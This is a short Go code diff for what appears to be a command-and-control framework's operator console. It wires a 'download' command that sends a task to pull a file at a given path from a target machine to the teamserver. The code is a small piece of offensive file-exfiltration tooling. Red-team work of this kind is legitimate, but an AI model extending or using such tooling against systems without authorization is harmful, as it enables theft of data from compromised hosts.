@@ -115,8 +115,11 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 	c.App.AddCommand(&grumble.Command{
 		Name: "download",
 		Help: "download a file from the target to teamserver",
+		Args: func(a *grumble.Args) {
+			a.String("path", "path to file on target")
+		},
 		Run: func(c *grumble.Context) error {
-			return nil
+			return SendTask(agentid, "download", c.Args.String("path"))
 		},
 	})
 
